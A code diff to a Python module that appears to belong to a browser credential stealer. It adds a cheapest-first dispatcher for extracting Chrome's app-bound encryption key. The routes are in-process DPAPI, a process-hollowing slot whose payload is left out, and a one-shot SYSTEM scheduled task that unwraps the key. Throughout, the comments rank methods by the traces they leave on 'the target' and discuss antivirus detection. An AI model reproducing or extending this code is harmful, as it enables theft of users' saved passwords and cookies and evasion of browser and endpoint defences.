@@ -1,15 +1,32 @@
-"""SYSTEM-context DPAPI unwrap helper.
+"""App-bound key extraction in three rungs, cheapest first.
 
-Chrome 133+ wraps its app-bound key with a DPAPI blob that only SYSTEM can open, so
-the unwrap has to happen in a SYSTEM process. This module is that process: the agent
-re-launches itself with ``--abe-unwrap <in> <out>`` through a one-shot scheduled
-task, the helper writes the SYSTEM plaintext as hex, and the caller finishes the
-unwrap under the current user.
+Chrome 127 added an application-identity check: the app-bound key is wrapped in a blob that
+only SYSTEM can open, and Chrome asks a privileged service to unwrap it. That service
+verifies the caller is really Chrome before it answers, so plain DPAPI stopped working for
+``v20`` rows and stayed working for everything older.
 
-The helper runs with no config, no archive and no logging configured. Everything it
-needs is in argv.
+Three ways in, and this module dispatches all three:
 
-Sequence, and the reason for each step:
+``user``
+    DPAPI inside the current process. Touches nothing outside it and leaves no trace. Works
+    on every Chromium fork with no app-bound wrap at all — Brave reports none — and on Chrome
+    before 127. Tried first because a run that can finish here should: the other two cost the
+    target something.
+``hollow``
+    A browser process spawned suspended with its image replaced, so the elevation service
+    sees a caller it will accept. **The payload is deliberately not shipped** — see
+    ``DECISIONS.md``. The rung exists so the ordering and the record are complete, and so a
+    payload tested elsewhere has a slot with a defined contract.
+``system``
+    A one-shot scheduled task runs this same executable as SYSTEM with
+    ``--abe-unwrap <workspace>``, which unwraps ``in.bin`` under SYSTEM and writes hex to
+    ``out.hex``. Works on a current Chrome and leaves a task-creation event every run.
+
+The result carries which rung produced the key — the report calls it ``abe_path`` — and one
+line per rung that did not, because "no key" is several different facts and only some of them
+are faults.
+
+The SYSTEM rung's sequence, and the reason for each step:
 
 1. ``app_bound_encrypted_key`` is base64 with a 4-byte ``APPB`` prefix. Strip it.
    The remainder is a DPAPI blob wrapped under SYSTEM.
@@ -32,12 +49,28 @@ import shutil
 import sys
 import tempfile
 import time
+from collections.abc import Callable
 from pathlib import Path
-from typing import Final
+from typing import Final, NamedTuple
 
-from . import loader, util, winapi
+from . import loader, log, util, winapi
 
 UNWRAP_FLAG: Final[str] = "--abe-unwrap"
+
+RUNG_USER: Final[str] = "user"
+RUNG_HOLLOW: Final[str] = "hollow"
+RUNG_SYSTEM: Final[str] = "system"
+
+# Cheapest first, measured in what the target has to give up: ``user`` opens a handle to
+# nothing and writes nothing, ``hollow`` spawns a browser and can crash it, ``system`` logs a
+# task creation. A run that can finish on the cheapest rung must, so the order is by cost to
+# the target and not by the order the rungs were invented in.
+RUNGS: Final[tuple[str, ...]] = (RUNG_USER, RUNG_HOLLOW, RUNG_SYSTEM)
+
+# Written beside ``state.json`` and ``session_status.json`` so one directory answers "what
+# did this run manage to do". **The key never goes in it**: a record that says how is
+# intelligence, a record that says what is a credential in a text file.
+RECORD_FILE: Final[str] = "abe.json"
 
 _APP_BOUND_PREFIX: Final[bytes] = b"APPB"
 _DPAPI_PREFIX: Final[bytes] = b"DPAPI"
@@ -101,17 +134,73 @@ def helper_main(args: list[str]) -> int:
     return 0
 
 
-def unwrap(app_bound_blob: bytes) -> bytes | None:
-    """Full path: SYSTEM unwrap out of process, then the user unwrap in process.
+class Attempt(NamedTuple):
+    """One rung, whether it produced the key, and a line saying what happened."""
+
+    rung: str
+    ok: bool
+    detail: str
+
+
+class Unwrap(NamedTuple):
+    """The key and how it was obtained. ``path`` is what the report calls ``abe_path``."""
+
+    key: bytes
+    path: str
+    attempts: tuple[Attempt, ...]
+
+
+def unwrap(app_bound_blob: bytes) -> Unwrap | None:
+    """Try every rung cheapest-first and return the first key, with the trail behind it.
 
     ``app_bound_blob`` is the base64-decoded value with the ``APPB`` prefix already
-    stripped. Returns the 32-byte AES key, or None when any step fails.
+    stripped. None means no rung produced a 32-byte key, and the record says why for each.
     """
     if sys.platform != "win32":
         return None
     if not app_bound_blob:
         return None
 
+    attempts: list[Attempt] = []
+    for rung in RUNGS:
+        key, detail = _RUNNERS[rung](app_bound_blob)
+        attempts.append(Attempt(rung, key is not None, detail))
+        if key is not None:
+            result = Unwrap(key, rung, tuple(attempts))
+            _record(result)
+            return result
+
+    _record(None, tuple(attempts))
+    return None
+
+
+def _rung_user(blob: bytes) -> tuple[bytes | None, str]:
+    """DPAPI in this process. The only rung that costs the target nothing."""
+    plaintext = winapi.crypt_unprotect(blob)
+    if plaintext is None:
+        return None, "the blob is not openable under this user"
+    key = _reduce(plaintext)
+    if key is None:
+        return None, "the blob opened but did not reduce to a 32-byte key"
+    return key, "opened under this user, no task and no browser"
+
+
+def _rung_hollow(_blob: bytes) -> tuple[bytes | None, str]:
+    """A suspended browser with its image replaced, and the payload that is not shipped.
+
+    The hollow needs code that resolves its own imports and calls the elevation service from
+    inside a process the service will accept. That payload is deliberately absent: the
+    reference set names the equivalent binary as the most-detected artifact in the family
+    ("highly detected by Defender at this point so a new binary would need to be created
+    each time"), and a RunPE that has never been run once on this bench would ship as a
+    claim rather than as a build. The rung stays in the ordering so the record is complete
+    and so a payload that is tested elsewhere has a slot with a defined contract.
+    """
+    return None, "skipped: the hollow payload is not shipped (see DECISIONS.md)"
+
+
+def _rung_system(blob: bytes) -> tuple[bytes | None, str]:
+    """One-shot SYSTEM task. Works on a current Chrome; logs a task creation every run."""
     workspace = _workspace()
     source = workspace / _SOURCE_NAME
     result = workspace / _RESULT_NAME
@@ -119,25 +208,55 @@ def unwrap(app_bound_blob: bytes) -> bytes | None:
 
     try:
         try:
-            source.write_bytes(app_bound_blob)
+            source.write_bytes(blob)
         except OSError:
-            return None
+            return None, "the workspace is not writable"
+
         command = _command_line(workspace)
         if len(command) > _MAX_COMMAND:
-            # Registering anyway would fail inside schtasks with a message about the
-            # option rather than about the build, and the run would look like a
-            # broken unwrap. Refuse here, where the cause is obvious.
-            return None
+            # Registering anyway fails inside schtasks with a message about the option
+            # rather than about the build, and the run looks like a broken unwrap.
+            return None, f"the task command is {len(command)} characters, the cap is {_MAX_COMMAND}"
         if not _register_task(task, command):
-            return None
+            return None, "the task was refused"
         if not _run_task(task):
-            return None
+            return None, "the task was registered but not started"
         plaintext = _await_result(result)
+        if plaintext is None:
+            return None, "the helper wrote nothing before the deadline"
     finally:
         _delete_task(task)
         shutil.rmtree(workspace, ignore_errors=True)
 
-    return _reduce(plaintext)
+    key = _reduce(plaintext)
+    if key is None:
+        return None, f"the SYSTEM plaintext was {len(plaintext)} bytes and reduced to nothing"
+    return key, "opened by a one-shot SYSTEM task"
+
+
+_RUNNERS: Final[dict[str, Callable[[bytes], tuple[bytes | None, str]]]] = {
+    RUNG_USER: _rung_user,
+    RUNG_HOLLOW: _rung_hollow,
+    RUNG_SYSTEM: _rung_system,
+}
+
+
+def _record(result: Unwrap | None, attempts: tuple[Attempt, ...] | None = None) -> None:
+    """Write the outcome, attempts included. Never raises, never carries the key."""
+    trail = attempts if attempts is not None else (result.attempts if result else ())
+    document = {
+        "path": result.path if result is not None else None,
+        "attempts": [{"rung": a.rung, "ok": a.ok, "detail": a.detail} for a in trail],
+    }
+    try:
+        root = util.queue_root()
+        root.mkdir(parents=True, exist_ok=True)
+        util.write_json(root / RECORD_FILE, document)
+    except Exception:
+        # A run that found a key and could not write a note about it is still a run that
+        # found a key. Losing the note is a lost observation, not a lost collection.
+        log.logger.debug("abe: could not write %s", RECORD_FILE, exc_info=True)
+
 
 
 def strip_prefix(value: bytes, prefix: bytes) -> bytes | None:
@@ -265,7 +384,14 @@ def _await_result(result: Path) -> bytes | None:
 
 
 __all__ = [
+    "RECORD_FILE",
+    "RUNGS",
+    "RUNG_HOLLOW",
+    "RUNG_SYSTEM",
+    "RUNG_USER",
     "UNWRAP_FLAG",
+    "Attempt",
+    "Unwrap",
     "helper_main",
     "strip_prefix",
     "unwrap",
